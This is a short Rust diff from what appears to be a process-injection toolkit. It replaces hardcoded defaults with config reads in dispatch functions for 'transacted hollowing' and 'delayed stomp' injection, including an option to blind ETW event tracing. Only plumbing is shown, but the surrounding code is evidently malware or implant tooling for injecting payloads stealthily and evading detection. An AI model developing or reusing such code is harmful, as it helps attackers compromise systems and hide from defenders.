@@ -2829,8 +2829,13 @@ fn inject_transacted_hollowing_dispatch(
 ) -> Result<InjectionHandle, InjectionError> {
     // Transacted hollowing creates its own sacrificial process; the pid
     // parameter is ignored (same as ProcessHollow).
-    let etw_blinding = true; // Default; TODO: read from config
-    let rollback_timeout_ms = 5000u32; // Default; TODO: read from config
+    let (etw_blinding, rollback_timeout_ms) =
+        crate::config::cached_config().map_or((true, 5000u32), |cfg| {
+            (
+                cfg.transacted_hollowing.etw_blinding,
+                cfg.transacted_hollowing.rollback_timeout_ms,
+            )
+        });
 
     unsafe {
         crate::injection_transacted::inject_transacted_hollowing(
@@ -2865,8 +2870,10 @@ fn inject_delayed_stomp_dispatch(
     pid: u32,
     payload: &[u8],
 ) -> Result<InjectionHandle, InjectionError> {
-    let min_delay = 8u32; // TODO: read from config
-    let max_delay = 15u32; // TODO: read from config
+    let (min_delay, max_delay) =
+        crate::config::cached_config().map_or((8u32, 15u32), |cfg| {
+            (cfg.delayed_stomp.min_delay_secs, cfg.delayed_stomp.max_delay_secs)
+        });
 
     unsafe {
         crate::injection_delayed_stomp::inject_delayed_stomp(
